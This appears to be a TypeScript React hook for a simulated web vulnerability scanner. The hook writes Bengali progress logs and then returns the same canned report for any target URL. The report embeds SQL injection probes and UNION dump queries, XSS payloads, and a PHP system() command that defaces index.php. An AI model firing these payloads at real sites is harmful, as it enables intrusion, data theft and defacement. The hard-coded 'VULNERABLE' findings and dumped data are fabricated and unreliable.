import { useCallback, useRef } from 'react';
import { AppState, NavigationParams, ScanLog, ScanResult } from '../types';
import { formatTimestamp } from '../utils';

export const useScanSimulation = (
  appState: AppState,
  updateAppState: (updates: Partial<AppState>) => void,
  navigateTo: (page: AppState['currentPage'], params?: NavigationParams) => void
) => {
  const scanIntervalRef = useRef<number | null>(null);

  const addLog = useCallback((message: string, type: ScanLog['type'] = 'info', payload = '') => {
    const timestamp = formatTimestamp();
    const newLog: ScanLog = { timestamp, message, type, payload };
    
    updateAppState({
      scanLogs: [...appState.scanLogs, newLog]
    });
  }, [appState.scanLogs, updateAppState]);

  const generateScanResult = (): ScanResult => {
    return {
      status: 'VULNERABLE',
      columnCount: 3,
      vulnerableColumns: [2, 3],
      databaseNames: ['web_app_db', 'users_db', 'information_schema'],
      systemInfo: {
        dbms: 'MySQL',
        dbmsVersion: '5.7.32',
        os: 'Linux'
      },
      fullDatabaseSchema: [
        {
          name: 'web_app_db',
          tables: [
            {
              name: 'users',
              columns: ['id', 'username', 'password', 'email'],
              dumpedData: [
                { id: 1, username: 'admin', password: 'hashed_admin_pass_123', email: 'admin@example.com' },
                { id: 2, username: 'user1', password: 'hashed_user1_pass_456', email: 'user1@example.com' },
                { id: 3, username: 'testuser', password: 'hashed_test_pass_789', email: 'test@example.com' },
              ]
            },
            {
              name: 'products',
              columns: ['product_id', 'name', 'description', 'price'],
              dumpedData: [
                { product_id: 101, name: 'Laptop', description: 'Gaming Laptop', price: 1200 },
                { product_id: 102, name: 'Mouse', description: 'Wireless Mouse', price: 50 },
              ]
            }
          ]
        },
        {
          name: 'users_db',
          tables: [
            {
              name: 'credentials',
              columns: ['user_id', 'hash', 'salt'],
              dumpedData: [
                { user_id: 1, hash: 'abc123def456', salt: 'salt1' },
                { user_id: 2, hash: 'ghi789jkl012', salt: 'salt2' },
              ]
            }
          ]
        }
      ],
      xssVulnerable: true,
      xssPayloadsFound: [
        { name: "Reflected XSS (Basic Script)", value: "<script>alert('XSSed!')</script>" },
        { name: "Reflected XSS (Image Error)", value: "<img src=x onerror=alert('XSS')>" },
        { name: "Reflected XSS (SVG Onload)", value: "<svg/onload=alert('XSS')>" }
      ],
      defacementPossible: true,
      defacementMethod: "Remote Code Execution (RCE) via File Upload",
      defacementPayloadExample: "<?php system('echo \"<img src=\\'YOUR_BANNER_LINK\\'><h1>Hacked By BugHunter Lab</h1>\" > index.php'); ?>",
      payloads: [
        { name: "Basic Injection Probe (Single Quote)", value: "' OR 1=1--" },
        { name: "Basic Injection Probe (Double Quote)", value: "\" OR 1=1--" },
        { name: "Union-Based Column Count", value: "1 UNION SELECT NULL,NULL,NULL--" },
        { name: "Database Enumeration", value: "-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--" },
        { name: "Data Dump (users)", value: "-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM web_app_db.users--" },
      ],
      requestResponse: `
Request:
GET /product.php?id=1' OR 1=1-- HTTP/1.1
Host: ${new URL(appState.targetUrl).hostname}
User-Agent: BugHunterLab/1.0

Response:
HTTP/1.1 200 OK
Content-Type: text/html
... (HTML content indicating vulnerability) ...
      `
    };
  };

  const startScan = useCallback(() => {
    if (scanIntervalRef.current) {
      clearInterval(scanIntervalRef.current);
    }

    updateAppState({ scanStatus: 'scanning' });

    const logs = [
      { step: 0, message: `টার্গেট URL: ${appState.targetUrl} ভ্যালিডেট করা হচ্ছে...`, type: 'info' as const },
      { step: 0, message: "URL ভ্যালিডেশন সফল।", type: 'success' as const },
      { step: 1, message: "SQL Injection প্রোব শুরু হচ্ছে...", type: 'info' as const },
      { step: 1, message: "পেলোড পরীক্ষা করা হচ্ছে: `' OR 1=1--`", type: 'probe' as const, payload: "' OR 1=1--" },
      { step: 1, message: "SQL Injection সম্ভাব্য বলে মনে হচ্ছে!", type: 'warning' as const },
      { step: 2, message: "কলাম সংখ্যা নির্ণয় করা হচ্ছে...", type: 'info' as const },
      { step: 2, message: "কলাম সংখ্যা পাওয়া গেছে: 3", type: 'success' as const },
      { step: 3, message: "দুর্বল কলাম সনাক্ত করা হচ্ছে...", type: 'info' as const },
      { step: 3, message: "কলাম 2 এবং 3 প্রিন্টযোগ্য/রিফ্লেক্টেবল।", type: 'success' as const },
      { step: 4, message: "ডেটাবেজের নাম সংগ্রহ করা হচ্ছে...", type: 'info' as const },
      { step: 4, message: "ডেটাবেজের নাম পাওয়া গেছে: `web_app_db, users_db`", type: 'success' as const },
      { step: 5, message: "টেবিল এনুমেরেশন সম্পন্ন।", type: 'success' as const },
      { step: 6, message: "কলাম এনুমেরেশন সম্পন্ন।", type: 'success' as const },
      { step: 7, message: "ডেটা ডাম্পিং সম্পন্ন।", type: 'success' as const },
      { step: 8, message: "XSS দুর্বলতা সনাক্ত করা হয়েছে!", type: 'warning' as const },
      { step: 9, message: "ডিফেসমেন্ট সম্ভাব্যতা যাচাই সম্পন্ন।", type: 'success' as const },
      { step: 10, message: "স্ক্যান সম্পন্ন হয়েছে।", type: 'success' as const },
    ];

    let logIndex = 0;

    scanIntervalRef.current = setInterval(() => {
      if (logIndex < logs.length) {
        const log = logs[logIndex];
        addLog(log.message, log.type, log.payload);
        updateAppState({ currentStep: log.step });
        logIndex++;
      } else {
        if (scanIntervalRef.current) {
          clearInterval(scanIntervalRef.current);
        }
        const result = generateScanResult();
        updateAppState({ 
          scanStatus: 'completed',
          scanResult: result
        });
        navigateTo('report', { scanId: appState.scanId || '' });
      }
    }, 1000);
  }, [appState.targetUrl, appState.scanId, addLog, updateAppState, navigateTo]);

  const pauseScan = useCallback(() => {
    if (scanIntervalRef.current) {
      clearInterval(scanIntervalRef.current);
    }
    updateAppState({ scanStatus: 'paused' });
    addLog("স্ক্যান বিরতি দেওয়া হয়েছে।", "info");
  }, [addLog, updateAppState]);

  const stopScan = useCallback(() => {
    if (scanIntervalRef.current) {
      clearInterval(scanIntervalRef.current);
    }
    updateAppState({ 
      scanStatus: 'pending',
      scanLogs: [],
      scanResult: null,
      currentStep: 0
    });
  }, [updateAppState]);

  return { startScan, pauseScan, stopScan };
};